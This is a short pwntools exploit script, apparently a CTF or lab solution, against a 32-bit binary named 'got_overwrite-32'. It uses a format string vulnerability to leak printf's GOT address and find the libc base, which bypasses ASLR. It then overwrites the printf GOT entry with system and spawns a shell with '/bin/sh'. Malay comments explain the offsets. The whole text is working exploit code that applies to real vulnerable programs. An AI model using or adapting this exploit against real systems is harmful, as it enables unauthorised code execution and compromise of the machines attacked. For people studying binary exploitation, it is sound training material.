from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
io = process()

libc = elf.libc



### ASLR bypass (Leak payload)

# 6 is because we fuzzed and found the entrypoint of the GOT address of printf to leak (dereference)
# Used %s to dereference the pointer (get value) as %p only prints the raw address



payload = b'%6$s'
payload += p32(elf.got['printf'])

io.sendline(payload)

printf_leak = u32(io.recv(4))

# Getting base address
libc.address = printf_leak - libc.sym['printf']
log.success(f'LIBC base: {hex(libc.address)}')



### Overwriting GOT values (Write Payload)

# fmtstr_payload injects additional arguments so the stack is shifted thats why use 5
payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
io.sendline(payload)



io.sendline('/bin/sh')

io.interactive()


# Senang cerita Leak payload dengan Write payload guna different offsets

# Leak payload boleh cari guna fuzzing script untuk leak printf GOT address / runtime
# Write payload boleh test manual untuk cari where buffer start